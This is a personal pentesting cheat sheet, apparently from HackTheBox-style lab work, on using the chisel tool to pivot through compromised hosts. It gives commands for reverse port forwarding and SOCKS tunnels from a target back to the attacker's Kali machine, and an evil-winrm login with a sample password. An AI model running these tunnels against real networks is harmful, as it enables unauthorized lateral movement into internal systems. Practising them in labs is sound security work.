# [[chisel]]  
___

## Description:
Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.

## Installation
[chisel](https://github.com/jpillora/chisel)

If you go to releases you can download the exe by OS. I typically use `chisel_1.8.1_linux_amd64` for my Kali machine and Linux targets

For Windows:
Go to the release page, get URL for 32bit or 64bit ( I used https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz), wget, gunzip, change name to chisel.exe


## Commands

### Port to Port proxy
This will be way faster than a socks proxy, do it this way if you need to visit a webpage or just need to port foward to one service
```
On kali:
./chisel server --reverse -p 9090
On target:
./chisel client 10.10.14.80:9090 R:8001:127.0.0.1:8001
```
In this example just visit `http://127.0.0.1:8001` in the browser without a proxy and you should hit the internal webpage.

**to forward winrm:**
your machine
`./chisel server --reverse -p 9002

pivot machine:
`./chisel client <your_machine>:9002 R:5985:172.16.22.1:5985

Login with evil-winrm:
`evil-winrm -i 10.10.14.95 -u 'matthew' -p '147258369'

### socks server
On your machine:
`./chisel server --reverse -p 1080`

On remote machine:
`chisel32.exe client 10.10.14.95:1080 R:socks`

To use in the browser, set foxy proxy to socks5, 127.0.0.1, 1080.
To use with burp, set browser to use burp proxy, then set socks proxy in burp by going to settings, network, connections

To use with proxychains:
`sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf``
(might be socks5)
